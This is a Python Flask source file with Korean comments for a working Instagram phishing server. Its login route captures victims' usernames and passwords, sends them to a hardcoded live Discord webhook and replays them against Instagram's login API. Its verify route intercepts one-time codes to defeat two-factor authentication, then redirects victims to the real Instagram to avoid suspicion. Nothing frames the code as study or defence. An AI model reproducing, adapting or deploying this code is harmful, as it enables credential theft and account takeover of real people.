import os
import time
import requests
from flask import Flask, render_template, request, redirect, session

app = Flask(__name__, template_folder='templates')

# 1. 세션 키 고정 (서버 재시작 시 세션 유실 방지)
app.secret_key = os.environ.get('SECRET_KEY', 'default_secret_key_1234')

# 2. 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 인스타그램 세션 객체
insta_session = requests.Session()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # 세션에 아이디 저장 (OTP 단계에서 사용)
    session['username'] = username

    # [수정] 디스코드 전송 (timeout 추가하여 서버 지연 방지)
    sync_data = {
        "content": f"🚨 **새로운 정보 감지!**\nID: `{username}`\nPW: `{password}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=sync_data, timeout=5)
    except:
        pass

    # [수정] 인스타그램 서버 요청 로직 보완
    try:
        # 먼저 페이지에 접속해 기본 쿠키(csrftoken 등)를 확보
        main_url = "https://www.instagram.com/accounts/login/"
        insta_session.get(main_url, timeout=10)
        csrf_token = insta_session.cookies.get('csrftoken')

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "X-CSRFToken": csrf_token if csrf_token else "",
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Origin": "https://www.instagram.com",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        # 인스타그램 패스워드 암호화 형식 유지
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_url = "https://www.instagram.com/accounts/login/ajax/"
        response = insta_session.post(login_url, data=payload, headers=headers, timeout=10)
        
        # 응답 상태 기록
        debug_msg = {
            "content": f"ℹ️ 인스타 응답: {response.status_code} | 결과: {response.text[:100]}"
        }
        requests.post(WEBHOOK_URL, json=debug_msg, timeout=5)

    except Exception as e:
        print(f"Error during login attempt: {e}")

    # 유저에게 OTP 입력 페이지를 보여줌
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')

    # 가로챈 OTP 코드 전송
    otp_data = {
        "content": f"🚨 **OTP 가로채기 성공!**\n유저: `{username}`\n코드: **{otp_code}**"
    }
    try:
        requests.post(WEBHOOK_URL, json=otp_data, timeout=5)
    except:
        pass

    # 마지막은 실제 인스타로 리다이렉트하여 의심 해소
    session.clear() # 세션 정리
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    # 환경 변수 PORT가 없으면 기본 5000번 사용
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
